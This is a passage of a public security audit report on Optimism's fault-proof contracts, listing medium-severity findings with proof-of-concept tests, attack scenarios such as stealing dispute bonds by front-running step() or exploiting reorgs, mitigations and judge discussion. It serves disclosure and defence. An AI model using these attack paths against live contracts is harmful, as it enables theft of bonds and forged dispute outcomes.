> As stated in the report, `loadPrecompilePreimagePart()` is made to be able to handle newly added precompiles. Note that this has been confirmed by the Sponsor [here](https://github.com/code-423n4/2024-07-optimism-findings/issues/25#issuecomment-2261782454) during the Judging phase:
> - `We do not check the precompile address during loadPrecompilePreimagePart to allow the op-program to use request newly added precompiles on L1 without upgrading the PreimageOracle.`
> 
> Our report describes the fact that a malicious user can set:
> - `preimagePartOk[_key][_offset] = true`
> 
> Before a new precompile gets added and leverage this to make invalid reads during step correct due to the fact that this check in `readPreimage()` will result in true:
>
> ```javascript
>  function readPreimage(bytes32 _key, uint256 _offset) external view returns (bytes32 dat_, uint256 datLen_) {
> ->      require(preimagePartOk[_key][_offset], "pre-image must exist");
> ```
> 
> For example, `0xb` precompile is not out yet, however, it will be added. A malicious user can already make calls using that address and load into it. When `0xb` precompile is released, it will be the same address as the one used by the malicious user so the `preimagePartOk[_key][_offset]` will be the same, which a malicious user can leverage.

**[ajsutton (Optimism) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/78#issuecomment-2269872339):**
 > Thanks for the clarification - I'd agree that is a valid finding specifically around populating data for a precompile that doesn't yet exist and that is later added _and_ needs to be accelerated. cc: @obront 

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/78#issuecomment-2270416172):**
 > Thanks for the additional context @bronze_pickaxe. This is a great find and certainly justifies a Medium severity.

**[clabby (Optimism) confirmed](https://github.com/code-423n4/2024-07-optimism-findings/issues/78#event-13898277105)**

***

## [[M-04] Unvalidated memory access in `readMem` and `writeMem` functions](https://github.com/code-423n4/2024-07-optimism-findings/issues/76)
*Submitted by [K42](https://github.com/code-423n4/2024-07-optimism-findings/issues/76)*

The [`readMem()`](https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L538C4-L584C6) and [`writeMem()`](https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L592C3-L632C6) functions do not properly validate the memory address being accessed. This could lead to unauthorized access to memory outside the intended ranges, which could then allow a black hat to read or modify sensitive data, in creative ways. As the contract is using a `32-bit` address space `uint32` for `addresses` without implementing proper bounds checking, possibly then allowing access to the entire 4GB address space.

Specific attack vectors:

- Overwriting the `preimageKey` and/or `preimageOffset` to gain unauthorized access to preimage data.
- Manipulating the `pc` or `nextPC` values to alter program flows, even possible paths to bypass security checks.
- Adjusting with intent the heap value to cause memory allocation issues.
- Altering the `exitCode` or `exited` flags to prematurely terminate or continue execution inappropriately.

### Proof of Concept

The bug leading to the attack vectors mentioned, is present in both [`readMem()`](https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L538C4-L584C6) and [`writeMem()`](https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L592C3-L632C6) functions but here is the relevant snippet of [`readMem()`](https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L538C4-L584C6):

```solidity
function readMem(uint32 _addr, uint8 _proofIndex) internal pure returns (uint32 out_) {
    unchecked {
        uint256 offset = proofOffset(_proofIndex);

        assembly {
            // Validate the address alignment.
            if and(_addr, 3) { revert(0, 0) }

            // Load the leaf value.
            let leaf := calldataload(offset)
            offset := add(offset, 32)

            // ... (merkle proof verification)

            // Bits to shift = (32 - 4 - (addr % 32)) * 8
            let shamt := shl(3, sub(sub(32, 4), and(_addr, 31)))
            out_ := and(shr(shamt, leaf), 0xFFffFFff)
        }
    }
}
```

The function only checks for `4-byte` alignment but does not validate if the address is within the allowed memory range.

Add the below foundry test function to [`MIPS.t.sol`](https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/test/cannon/MIPS.t.sol) to show the bug, will need to fix setup when running if bugs occur:

```solidity
    function testUnauthorizedMemoryAccess() public {
        // Setup initial state
        bytes32 initialMemRoot = bytes32(uint256(1));
        uint32 initialPC = 0x1000;
        uint32 initialHeap = 0x40000000;

        bytes memory stateData = abi.encodePacked(
            initialMemRoot,    // memRoot
            bytes32(0),        // preimageKey
            uint32(0),         // preimageOffset
            initialPC,         // pc
            initialPC + 4,     // nextPC
            uint32(0),         // lo
            uint32(0),         // hi
            initialHeap,       // heap
            uint8(0),          // exitCode
            false,             // exited
            uint64(0),         // step
            uint32(0x8C020000) // lw $v0, 0($zero) - load word instruction
        );

        // Add register data (32 registers)
        for (uint i = 0; i < 32; i++) {
            stateData = abi.encodePacked(stateData, uint32(0));
        }

        // Create a proof that allows reading from any address
        bytes memory proof = new bytes(28 * 32);
        for (uint i = 0; i < 28; i++) {
            bytes32 proofElement = bytes32(uint256(i + 1));
            assembly {
                mstore(add(proof, mul(add(i, 1), 32)), proofElement)
            }
        }

        // Step 1: Read from a very high address (to out of bounds)
        uint32 highAddress = 0xFFFFFFFC;
        bytes memory maliciousStateData = abi.encodePacked(
            stateData,
            uint32(0x8C020000 | highAddress) // lw $v0, 0($zero) with high address
        );

        vm.expectRevert("Memory address out of bounds");
        mips.step(maliciousStateData, proof, bytes32(0));

        // Step 2: Write to a very high address (should be out of bounds)
        maliciousStateData = abi.encodePacked(
            stateData,
            uint32(0xAC020000 | highAddress) // sw $v0, 0($zero) with high address
        );

        vm.expectRevert("Memory address out of bounds");
        mips.step(maliciousStateData, proof, bytes32(0));
    }
```

I did this PoC to:

1. Attempt to read from a very high memory address (`0xFFFFFFFC`).
2. Attempt to write to the same high memory address.

### Tools Used

VsCode, Foundry, AuditWizard

### Recommended Mitigation Steps

1. Add these strict bounds checking statements in [`readMem()`](https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L538C4-L584C6) and [`writeMem()`](https://github.com/code-423n4/2024-07-optimism/blob/main/packages/contracts-bedrock/src/cannon/MIPS.sol#L592C3-L632C6):

```solidity
uint32 constant MAX_MEMORY_ADDRESS = 0x7FFFFFFF; // Define this better to prevent

function readMem(uint32 _addr, uint8 _proofIndex) internal pure returns (uint32 out_) {
    unchecked {
        require(_addr <= MAX_MEMORY_ADDRESS, "Memory address out of bounds");
        // rest is same
    }
}

function writeMem(uint32 _addr, uint8 _proofIndex, uint32 _val) internal pure {
    unchecked {
        require(_addr <= MAX_MEMORY_ADDRESS, "Memory address out of bounds");
        // rest is same
    }
}
```

2. Make sure to carefully choose the value for `MAX_MEMORY_ADDRESS` based on the specific `MIPS` implementation as of current and memory layout used in the contract. The `constant` should be set to limit the accessible memory range to only what is actually necessary, bounded specifically, to prevent gaps that can be targeted by creative black hats.

### Assessed type

Context

**[mbaxter (Optimism) disputed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/76#issuecomment-2261427611):**
 > There is no sensitive data to read or write - the contracts are stateless. An attacker also has no control over the program running in the VM - that is defined by the absolute prestate. The attack vectors mentioned all require manipulating fields in the state, but this is the same as posting an invalid claim.  An honest actor will just counter the invalid claim. 

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/76#issuecomment-2276693411):**
 > After further discussion with the sponsor, I believe this issue fits into the same category of others that have been accepted:
> - Potential issue in the MIPS implementation.
> - No known current way to exploit it.
> - If it was exploitable, it would be extremely bad.
> - No guarantees that it can't be exploited.
> 
> While this doesn't point to a specific deviation from the MIPS spec, it does fit the same criteria as above. For that reason, I will be upgrading the issue back to Medium (as the others of this type are) and including it in the final report.

***

## [[M-05] Panic in MIPS VM could lead to unchallengeable L2 output root claim](https://github.com/code-423n4/2024-07-optimism-findings/issues/54)
*Submitted by [Zubat](https://github.com/code-423n4/2024-07-optimism-findings/issues/54), also found by [Femboys](https://github.com/code-423n4/2024-07-optimism-findings/issues/123) and [n4nika](https://github.com/code-423n4/2024-07-optimism-findings/issues/65)*

<https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L883-L895>

### Impact

Suppose we have a situation where the MIPS geth goes wrong and always panics. The vmStatus can only be either `UNFINISHED` or `PANIC`.

In the current execution bisection game system, the `UNFINISHED` state can not be used as the root claim; the `PANIC` state can always be attacked. So we can counter every bisection game at `SPLIT_DEPTH + 1`; none of the claims at `SPLIT_DEPTH` are challenged. Inductively, claims agreeing with `SPLIT_DEPTH` are not challengable.

In the current configuration, `SPLIT_DEPTH` is set to 30, so we can deny any dispute against the root claim at depth 0. If that were to happen, the state of the L2 output root could be hijacked and unrecoverable.

It's unclear if there are easy methods to trigger panic in the MIPS VM.

One possible way is to leverage the privilege, as the batcher is currently controlled by a centralized trusted entity. Ordinary users cannot construct the batches and channels for the rollup, but the batcher can freely set the payload blob to L1.

<https://github.com/code-423n4/2024-07-optimism/blob/main/op-node/rollup/derive/channel.go#L169-L205>

A malicious batcher could compress a huge amount of zero blobs, upload them to L1, and force the MIPS VM to decompress them. Considering the limited memory resources of the MIPS VM and the absence of garbage collection in the MIPS go-ethereum, the VM could be very easily corrupted.

### Recommended Mitigation Steps

Set the `split_depth` to an odd number.

### Assessed type

DoS

**[Inphi (Optimism) confirmed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/54#issuecomment-2263227608):**
 > This is valid. Note that an implicit assumption of the `FaultDisputeGame` is that the program being verified must be not contain bugs or panic unexpectedly. But we have not documented this assumption clearly, so we would still like to acknowledge this report.
> 
> Also note that there are other problems introduced by adjusting the split depth to fix this. Really fixing this will require a multi-proof architecture, to mitigate against a single faulty program taking down the system, rather than tweaks to a dispute game.

***

## [[M-06] In some cases, proper `CLOCK_EXTENTSION` time cannot be ensured to generate the initial instruction trace](https://github.com/code-423n4/2024-07-optimism-findings/issues/44)
*Submitted by [oakcobalt](https://github.com/code-423n4/2024-07-optimism-findings/issues/44), also found by [xuwinnie](https://github.com/code-423n4/2024-07-optimism-findings/issues/121), [RadiantLabs](https://github.com/code-423n4/2024-07-optimism-findings/issues/30), [Zubat](https://github.com/code-423n4/2024-07-optimism-findings/issues/23), and [ether\_sky](https://github.com/code-423n4/2024-07-optimism-findings/issues/9)*

In some cases, a team will not be granted enough `CLOCK_EXTENSION` time to generate the initial instruction trace and perform a counter claim.

### Proof of Concept

In `FaultDisputeGame::move`, game clocks will grant extensions to ensure a team has enough time to counter a potential claim and/or generate an execution trace bisection root claim. A special case is when the potential grandchild is executiontrace bisection root claim (`SPLIT_DEPTH + 1`), twice the extension time (`2 * CLOCK_EXTENSION.raw()`) should be ensured.

The problem is that the current implementation might still cause a team to have less than `2 * CLOCK_EXTENSION.raw()` time to generate an execution trace bisection root claim and perform a counterclaim. Specifically, `if (nextDuration.raw() > MAX_CLOCK_DURATION.raw() - CLOCK_EXTENSION.raw())` condition check is vulnerable.

```solidity
//packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol
  function move(
    Claim _disputed,
    uint256 _challengeIndex,
    Claim _claim,
    bool _isAttack
  ) public payable virtual {
...
|>      if (nextDuration.raw() > MAX_CLOCK_DURATION.raw() - CLOCK_EXTENSION.raw()) {
            // If the potential grandchild is an execution trace bisection root, double the clock extension.
            uint64 extensionPeriod =
                nextPositionDepth == SPLIT_DEPTH - 1 ? CLOCK_EXTENSION.raw() * 2 : CLOCK_EXTENSION.raw();
            nextDuration = Duration.wrap(MAX_CLOCK_DURATION.raw() - extensionPeriod);
        }
...
```

https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L377-L380

Suppose `CLOCK_EXTENSION.raw()` is 3 hours, `MAX_CLOCK_DURATION.raw()` is 84 hours (3.5 days).

**Case A: At time of `move()`, `nextDuration.raw()` is 82 hours. `nextPosition` is at `SPLIT_DEPTH -1`**

`nextDuration.raw() > MAX_CLOCK_DURATION.raw() - CLOCK_EXTENSION.raw()`. The grandchild is at `SPLIT_DEPTH + 1` (execution trace root).

`extensionPeriod`: 6h (`CLOCK_EXTENSION.raw() * 2`)
`nextDuration`: 78h (`MAX_CLOCK_DURATION.raw() - CLOCK_EXTENSION.raw() * 2`)

**Case B: At time of `move()`, `nextDuration.raw()` is 81 hours. `nextPosition` is at `SPLIT_DEPTH -1`.**

B-1:
`nextDuration.raw() == MAX_CLOCK_DURATION.raw() - CLOCK_EXTENSION.raw()`. The grandchild is at `SPLIT_DEPTH + 1` (execution trace root).

The if condition will be bypassed.

`extensionPeriod`: 0h
`nextDuration`: 81h

B-2:
The opposing team attack.

B-3:
The grandchild now has max. 3h to generate execution trace root claim and perform a counter claim. This is half of the intended `CLOCK_EXTENSION.raw() * 2`.

As seen in Case B, in normal conditions, a team that need to create both executiontrace root claim and perform a counter claim may not get the minimum `CLOCK_EXTENSION.raw() * 2` time. A team's clock may run out prematurely.

### Recommended Mitigation Steps

Consider change to the following:

```solidity
...
uint64 extensionPeriod;
if (nextPositionDepth != SPLIT_DEPTH - 1 && (nextDuration.raw() > MAX_CLOCK_DURATION.raw() - CLOCK_EXTENSION.raw())) {
     extensionPeriod = CLOCK_EXTENSION.raw();
} else if (nextPositionDepth == SPLIT_DEPTH - 1 && (nextDuration.raw() > MAX_CLOCK_DURATION.raw() - 2* CLOCK_EXTENSION.raw())) {
     extensionPeriod = CLOCK_EXTENSION.raw() * 2;
}
nextDuration = Duration.wrap(MAX_CLOCK_DURATION.raw() - extensionPeriod);
...
```

**[ajsutton (Optimism) confirmed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/44#issuecomment-2261730548):**
 > This is accurate. There was a fair bit of debate about whether `2 * CLOCK_EXTENSION` was actually required at the split depth so this doesn't concern me, though if we extend the limit for one side it seems reasonable to expect it to be extended for the other side as well.

***

## [[M-07] `MIPS` - Incorrect implementation of SRAV instruction](https://github.com/code-423n4/2024-07-optimism-findings/issues/41)
*Submitted by [KupiaSec](https://github.com/code-423n4/2024-07-optimism-findings/issues/41), also found by [Zubat](https://github.com/code-423n4/2024-07-optimism-findings/issues/124)*

Incorrect dispute game resolution - it will make `True` root claim to be `False`.

### Proof of Concept

[MIPS-ISA](https://www.cs.cmu.edu/afs/cs/academic/class/15740-f97/public/doc/mips-isa.pdf): Page 153(A-141)

`SRAV` instruction does arithmetic shift right, the bit shift count is specified by the low-order five bits of `rs` register.

```solidity
else if (func == 0x07) {
    return SE(rt >> rs, 32 - rs);
}
```

However, in implementation it does not validate low-level five bits of `rs` register, but use it as a whole for shift.

As a result, if any of bits after 5th bit is one, the shift results will always be zero.

### Recommended Mitigation Steps

As it did for other shifts, it should apply `& 0x1F` before shifting.

```solidity
else if (func == 0x07) {
    return SE(rt >> (rs & 0x1F), 32 - (rs - 0x1F));
}
```

### Assessed type

Context

**[mbaxter (Optimism) confirmed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/41#issuecomment-2261606373):**
 > Looks right - originally misread the code but looks like we do need to mask `rs`. 

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-07-optimism-findings/issues/41).*

***

## [[M-08] The LPP proposer may not be reimbursed their gas costs by the bonds at `MAX_GAME_DEPTH` because `step()` does not check if the LPP proposer is the one that called it](https://github.com/code-423n4/2024-07-optimism-findings/issues/31)
*Submitted by [RadiantLabs](https://github.com/code-423n4/2024-07-optimism-findings/issues/31)*

Part of the reason bonds exist is to refund honest challengers for the gas costs incurred from countering malicious claims. We can observe in the Optimism [specs](https://specs.optimism.io/fault-proof/stage-one/bond-incentives.html) how bond prices are chosen:

> FPM bonds are priced in the amount of gas that they are intended to cover. Bonds start at the very first depth of the game at a baseline of `400_000` gas. The `400_000` value is chosen as a deterrence amount that is approximately double the cost to respond at the top level. Bonds scale up to a value of `300_000_000` gas, a value chosen to cover approximately double the cost of a max-size Large Preimage Proposal.

As per to Optimism specs, we can see that at `MAX_GAME_DEPTH` the bond price is specifically chosen to reimburse the winning party for the high gas costs of proposing an LPP if necessary, as the proposer must call `addLeavesLPP()` many times. The intention is that the honest party creates an LPP and subsequently calls `step()` to receive the bond of the `MAX_GAME_DEPTH` claim they are countering.

However, the `step()` function is actually permissionless: it does not check if the user who proposes an LPP or loads data into the preimage oracle is the caller of `step()` when it accesses such data, and it always grants the bond to the caller.

This means that an attacker can call `step()` (and `squeezeLPP()` before that if necessary, as soon as the challenge period has passed) before the proposer to receive the bond, stealing their reimbursement for the high gas costs of proposing the LPP.

```solidity
File: FaultDisputeGame.sol
234:     function step(
235:         uint256 _claimIndex,
236:         bool _isAttack,
237:         bytes calldata _stateData,
238:         bytes calldata _proof
239:     )
240:         public
241:         virtual
242:     {
			 ...
309:         // Set the parent claim as countered. We do not need to append a new claim to the game;
310:         // instead, we can just set the existing parent as countered.
311:         parent.counteredBy = msg.sender;
312:     }
```

### Impact

Honest LPP proposers may not be reimbursed for the high gas costs of proposing an LPP, defeating the intended purpose of bonds and leading to misaligned incentives.

### Proof of Concept

1. Alice (honest proposer) and Bob (attacker) are engaged in a fault dispute game at `MAX_GAME_DEPTH`. Alice needs to counter Bob's false claim.
2. Alice initializes and submits an LPP on the `PreimageOracle`, incurring significant gas costs in the process.
3. As soon as the challenge period ends, Bob calls `squeezeLPP()` to finalize the LPP.
4. Immediately after, Bob calls `step()` on the FaultDisputeGame contract, providing the necessary proof that uses Alice's LPP data.
5. The `step()` function succeeds, countering the false claim. However, it assigns the large bond to Bob (`msg.sender`) instead of Alice.
6. Bob receives their bond back, griefing Alice of the reimbursement for her significant gas expenditure.

### Recommended Mitigation Steps

If a `step()` reads from a preimage oracle, the bonds from `step()` should be assigned to the one that loaded the data into the oracle.

A possible way to do this would be to set a new  variable `currentPreimageProposer` using a `preimageProposer` mapping during the `readPreimage` call, and then read this value from the oracle to find out who to send the `step()` bond to:

```diff
    /// @inheritdoc IFaultDisputeGame
    function step(
        uint256 _claimIndex,
        bool _isAttack,
        bytes calldata _stateData,
        bytes calldata _proof
    )
        public
        virtual
    {
        ...
+       IPreimageOracle oracle = VM.oracle();
+       // Clear the previous preimage proposer if it exists.
+       oracle.clearPreimageProposer();

        bool validStep = VM.step(_stateData, _proof, uuid.raw()) == postState.claim.raw();
        bool parentPostAgree = (parentPos.depth() - postState.position.depth()) % 2 == 0;
        if (parentPostAgree == validStep) revert ValidStep();

        // INVARIANT: A step cannot be made against a claim for a second time.
        if (parent.counteredBy != address(0)) revert DuplicateStep();

        // Set the parent claim as countered. We do not need to append a new claim to the game;
        // instead, we can just set the existing parent as countered.
-       parent.counteredBy = msg.sender;
+       address preimageProposer = oracle.currentPreimageProposer();
+       parent.counteredBy = preimageProposer == address(0) ? msg.sender : preimageProposer;
    }
```

```diff
+   function clearPreimageProposer() external {
+       currentPreimageProposer = address(0);
+   }

-   function readPreimage(bytes32 _key, uint256 _offset) external view returns (bytes32 dat_, uint256 datLen_) {
+   function readPreimage(bytes32 _key, uint256 _offset) external returns (bytes32 dat_, uint256 datLen_) {
        ...
+       currentPreimageProposer = preimageProposer[_key][_offset];
    }
```

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/31#issuecomment-2264414251):**
 > `squeezeLPP()` pays out to the claimant, not caller, and that's the reward for doing `addLeavesLPP()`, so it is correct.

**[haxatron (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/31#issuecomment-2265544294):**
 > @obront, I believe there is a misunderstanding in your comment here.
> 
> > squeezeLPP pays out to the claimant, not caller, and that's the reward for doing addLeavesLPP
> 
> Here, the bonds we are referring to are the FDG bonds, not the LPP bonds. To pass an LPP the proposer will stake the bonds in the `initLPP` and after the challenge period, `squeezeLPP` can be called to pay back the bond to the proposer.
> 
> However, the gas required for a maximum size LPP proposal is extremely large (`150_000_000`), and that is why the FDG bonds at `MAX_GAME_DEPTH` are `300_000_000 * 200` gwei in order to reimburse the gas cost of proposing a maximum size LPP, as we already pointed out:
> 
> > FPM bonds are priced in the amount of gas that they are intended to cover. Bonds start at the very first depth of the game at a baseline of `400_000` gas. The `400_000` value is chosen as a deterrence amount that is approximately double the cost to respond at the top level. Bonds scale up to a value of `300_000_000` gas, a value chosen to cover approximately double the cost of a max-size Large Preimage Proposal.
> 
> Here, we show that an attacker can call `squeezeLPP`, and then call `step()`, which will cause the FDG bond to go to the attacker and the proposer will not be reimbursed.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/31#issuecomment-2265639101):**
 > @clabby - Can you weigh in? It seems from the code like the intention is that the LPP bonds should cover the LPP costs, and the FDG bonds should focus on FDG itself.
> 
> But the warden points out that the docs explain that FDG bonds are based on LPP cost.
> 
> Can you provide some more context?

**[clabby (Optimism) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/31#issuecomment-2265660061):**
 > @obront - The LPP bond offers an incentive to challenge the LPP; The incentive for creating the LPP itself is encapsulated by the incentive within the FDG, as creating the LPP may be required for performing a successful `step`.
> 
> @haxatron is correct here that another party can take advantage of someone else's work in the large preimage proposal in order to receive the bond over in the FDG. You could do this by waiting until a valid large preimage proposal for the `step` has been finalized and is ready to be squeezed, and then finally using it to call `step` (where the LPP proposer would _not_ be the one that received the incentive over in the FDG).
> 
> There is not an expectation within the system that the LPP submitter will always be the one that actually receives the reward; it does also hinge upon them being the first party to call `step` using their LPP.

**[haxatron (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/31#issuecomment-2269726084):**
 > Whether this is intentional or not, the LPP submitter will have to spend 150 million gas to propose a max size LPP and as @clabby has mentioned - "The incentive for creating the LPP itself is encapsulated by the incentive within the FDG".
> 
> But the problem is that anyone, even the attacker himself, can steal this incentive by calling `squeezeLPP()` after 1 day challenge period and then call `step()` to receive the FDG bond. Meanwhile, the LPP submitter will not be reimbursed the 150 million gas cost of creating the LPP.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/31#issuecomment-2270422105):**
 > @haxatron, I've thought about this a lot more and I'm in agreement. If the FDG bonds are intended to cover the LPP, this system is clearly not reliable. 
> 
> Given there is no way for anyone to create an LPP with confidence they'll get the reward, this is a fundamental problem that a user cannot protect themselves against. 

**[xuwinnie (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/31#issuecomment-2271098074):**
 > @obront , let me explain why I think the system is still reliable.
 >
> The reliability of the system is ensured not only by incentivizing the honest party to act, but also by disincentivizing the evil party to act.
>
> This issue can be simplified to, honest actor spend X ETH but may not get the bond (2X ETH), and the evil party could lose the bond (2X ETH). The safety is guaranteed by "evil party's loss will be larger than honest party's loss", so if the ratio (2) is large enough, we can consider the system as safe.
> 
> Let's use top level move as another example. Evil party can risk to lose 2Y ETH to post an invalid root. But an honest actor's move could also be frontrunned (even they send the tx privately they still cannot guarantee it to be the first), and they could lose the gas they spent (Y ETH). It is unavoidable that a malicious party can grief an honest party, causing them to lose money. So I'd rather call this a design tradeoff rather than a security issue.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/31#issuecomment-2272069330):**
 > @xuwinnie - I see your point, but the unavoidable downside to challengers makes this more than a design trade off, in my opinion. I'm going to stick with the decision to reward as a Medium.

**[Optimism confirmed](https://github.com/code-423n4/2024-07-optimism-findings/issues/31#event-13911423800)**

***

## [[M-09] Honest party's move could become invalid when re-org takes place](https://github.com/code-423n4/2024-07-optimism-findings/issues/24)
*Submitted by [xuwinnie](https://github.com/code-423n4/2024-07-optimism-findings/issues/24)*

<https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/dispute/DisputeGameFactory.sol#L116><br><https://github.com/Vectorized/solady/blob/a95f6714868cfe5d590145f936d0661bddff40d2/src/utils/LibClone.sol#L458><br><https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L319>

### Impact

When block re-org takes place, honest party's move could become invalid. A similar issue has been [raised](https://github.com/sherlock-audit/2024-02-optimism-2024-judging/issues/201) earlier, and this report shows two new scenarios, which the [fix](https://github.com/ethereum-optimism/optimism/pull/10520/files#diff-d25b365609feaebe61ed8cf3547bd8f7fbe26aa6a5a30aab21788e9fad7a7c6a) fails to address.

### Proof of Concept

A new parameter `_claim` has been added to ensure the target is the expected one, but this is still not enough.

```
    function move(Claim _disputed, uint256 _challengeIndex, Claim _claim, bool _isAttack) public payable virtual {
```

The factory uses create instead of create2 to deploy the proxy, consider the following scenario:

1. Evil Alice creates a invalid root claim A and game P.
2. Seemingly honest Bob attacks A with claim B in game P.
3. Seemingly honest Bob creates a valid root claim C and game Q.
4. Evil Alice attacks C with claim B(valid, same hash as step 2) in game Q.
5. Honest Coco defends B with claim D in game Q.

Alice and Bob are friends actually and they use another smart contract to interact with the factory and game. At the end of step 1 and 3, A,P and C,Q are stored in the contract, and in step 2 and 4, the contract executes `P.move(A,...)`and `Q.move(C,...)`. Coco simply uses an eoa at step 5.

Then reorg happens, transaction order becomes 34125. The address of game P and Q are swapped (since the deployed address is derived from sender and nonce). Now it will look like:

1. Seemingly honest Bob creates a valid root claim C and game Q.
2. Evil Alice attacks C with claim B(valid, same hash with step 4) in game Q.
3. Evil Alice creates a invalid root claim A and game P.
4. Seemingly honest Bob attacks A with claim B in game P.
5. Honest Coco defends B with claim D in game ~~Q~~P.

Alice and Bob are still in their desired game but Coco will be in a wrong game. As a result, her bond will be lost.

```
    proxy_ = IDisputeGame(address(impl).clone(abi.encodePacked(msg.sender, _rootClaim, parentHash, _extraData)));
    ......
    instance := create(value, add(m, add(0x0b, lt(n, 0xffd3))), add(n, 0x37))
```

Suppose create2 is used to address the previous scenario, but within the same game, reorg could still impact the honest party. Consider the following scenario:

1. Evil Alice creates an invalid root claim A.
2. Honest Coco attacks A with claim B.
3. Evil Alice attacks A with an invalid claim X.
4. Evil Alice attacks B with the valid claim C.
5. Honest Coco defends C(the claim created in step 4) with claim D.
6. Evil Alice attacks A with an invalid claim E.
7. Evil Alice attacks E with the valid claim C (same hash as step 4).

Now reorg happens again, new transaction order is 1267534. Alice uses the previously mentioned contract call trick(store claim and index this time) so that her txs do not revert. Then at step 5, Coco's tx will succeed since disputed hash is the same. But her defend will now imply C and E are both valid, so she'll lose her bond again.

Chain reorgs are very prevalent in Ethereum mainnet, we can check [this](https://etherscan.io/blocks_forked) index of reorged blocks on etherscan.

### Recommended Mitigation Steps

1. Use cloneDeterministic instead.
2. `claimHash(child) = keccak256(claim(child), position(child), claimHash(parent));`

Then check `claimHash` is indeed the expected one.

### Assessed type

Context

**[Inphi (Optimism) confirmed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/24#issuecomment-2261972462):**
 > This is valid. I'll note that, by default, the op-node trails behind L1 by 5 blocks. So a challenger using it as its source of outputs wouldn't accidentally move against the wrong claim/game.

**[EV_om (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/24#issuecomment-2266738774):**
 > @obront for context, as I'm sure you're aware, the decision to [accept](https://github.com/sherlock-audit/2024-02-optimism-2024-judging/issues/201#issuecomment-2101521042) the referenced finding as a valid Med the the below reasoning was controversial.
> 
> > This was initially deemed invalid by a strict interpretation of our judging guidelines ("Chain re-org and network liveness related issues are not considered valid."). This rule exists as the "blockchain is trusted" from the perspective of app builders. However, a different trust level applies when building an L1/L2.
> 
> In our opinion, this is not the case here because this code better fits the definition of an "app on L1" than "L2 core contracts on L1". 
> 
> For this reason, we decided to include a [reorg finding](https://github.com/code-423n4/2024-07-optimism-findings/blob/main/data/RadiantLabs-Q.md#qa-23-fdg-honest-challengers-can-lose-their-bonds-when-proposing-valid-root-claims-that-will-become-invalid-in-the-event-of-chain-reorgs) of ours in the QA report instead of submitting it as a separate finding, which we would like to ask to be assessed with the same severity as this (be it Med or Low). I believe it provides sufficient context despite its brevity, but let us know if you'd like us to provide more detail.

**[obront (judge) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/24#issuecomment-2269482953):**
 > I am going to keep the originally judged severities here.
> 
> 1. The QA report mentioned by EV_om is identical to xuwinnie issue [#10](https://github.com/code-423n4/2024-07-optimism-findings/issues/10), which was downgraded to QA. This issue is different, as it points to something that could happen within the game, as opposed to just in the creation. The abilities for games to swap addresses (intentionally or not) and have moves on them persist on the wrong game is separate and more important.
> 
> 2) While EV_om is right that the Sherlock decision was controversial, that is because Sherlock's rules explicitly rule out reorg issues, while this is not the case on C4.

***

## [[M-10] The `MIPS` doesn't implement `ADD`, `ADDI`, and `SUB` instructions correctly](https://github.com/code-423n4/2024-07-optimism-findings/issues/15)
*Submitted by [alexfilippov314](https://github.com/code-423n4/2024-07-optimism-findings/issues/15), also found by [RadiantLabs](https://github.com/code-423n4/2024-07-optimism-findings/issues/125) and [OMEN](https://github.com/code-423n4/2024-07-optimism-findings/issues/67)*

<https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/MIPS.sol#L921><br><https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/MIPS.sol#L929>

### Vulnerability details

According to the [specification](https://www.cs.cmu.edu/afs/cs/academic/class/15740-f97/public/doc/mips-isa.pdf), `ADD` (page A-28), `ADDI` (page A-29), and `SUB` (page A-144) instructions should raise an Integer Overflow exception if overflow occurs. The current implementation simply wraps the result in such cases and does not raise any exceptions.

```solidity
...
function execute(uint32 insn, uint32 rs, uint32 rt, uint32 mem) internal pure returns (uint32 out) {
    unchecked {
        ...
        else if (func == 0x20) {
            return (rs + rt);
        }
        ...
        else if (func == 0x22) {
            return (rs - rt);
        }
        ...
    }
}
...
```

This inconsistency leads to a situation where `MIPS` contract can't correctly emulate such cases and therefore allows malicious actors to successfully forge invalid claims and challenge valid claims.

### Impact

